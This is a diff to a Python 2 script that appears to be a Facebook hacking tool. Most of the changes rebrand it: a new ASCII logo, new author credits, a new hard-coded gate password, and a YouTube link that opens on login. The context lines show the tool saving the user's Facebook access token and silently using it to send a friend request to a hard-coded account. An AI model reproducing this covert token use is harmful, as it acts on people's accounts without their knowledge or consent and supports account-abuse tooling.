@@ -47,19 +47,18 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ _______  ______  _________ ______  
-(  ___  )(  ___ \ \__   __/(  __  \ 
-| (   ) || (   ) )   ) (   | (  \  )
-| (___) || (__/ /    | |   | |   ) |
-|  ___  ||  __ (     | |   | |   | |
-| (   ) || (  \ \    | |   | |   ) |
-| )   ( || )___) )___) (___| (__/  )
-|/     \||/ \___/ \_______/(______/ 
+logo = """ 
+███████╗███████╗███████╗░██████╗██╗░░██╗██╗
+╚════██║██╔════╝██╔════╝██╔════╝██║░░██║██║
+░░███╔═╝█████╗░░█████╗░░╚█████╗░███████║██║
+██╔══╝░░██╔══╝░░██╔══╝░░░╚═══██╗██╔══██║██║
+███████╗███████╗███████╗██████╔╝██║░░██║██║
+╚══════╝╚══════╝╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mAbid Khan
-\033[1;96mInstagram \033[1;93m: \033[1;92mAb.id6644
-\033[1;96mFacebook  \033[1;93m: \033[1;92mAbid Khan
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Abid6t
+\033[1;96mAuthor  \033[1;93m: \033[1;92mZ K
+\033[1;96mInstagram \033[1;93m: \033[1;92mtechzk9211
+\033[1;96mFacebook  \033[1;93m: \033[1;92mAbbas Khan
+\033[1;96mYoutube \033[1;93m: \033[1;92mZ K TECH
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +79,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mAbid Khan
-\033[1;96mInstagram \033[1;93m: \033[1;92mAb.id6644
-\033[1;96mFacebook  \033[1;93m: \033[1;92mAbid Khan
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Abid6t
+\033[1;96mAuthor  \033[1;93m: \033[1;92mZ K
+\033[1;96mInstagram \033[1;93m: \033[1;92mTECHZK9211
+\033[1;96mFacebook  \033[1;93m: \033[1;92mAbbas Khan
+\033[1;96mYoutube \033[1;93m: \033[1;92mZ K TECH
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "Abid6t"
-CorrectPassword = "Abid"
+CorrectUsername = "zk9211"
+CorrectPassword = "lovezk"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,10 +99,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Facebook.com/Omi6t')
+            os.system('xdg-open https://www.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Facebook.com/Omi6t')
+        os.system('xdg-open https://www.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
 
 def login():
 	os.system('clear')
@@ -144,7 +143,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
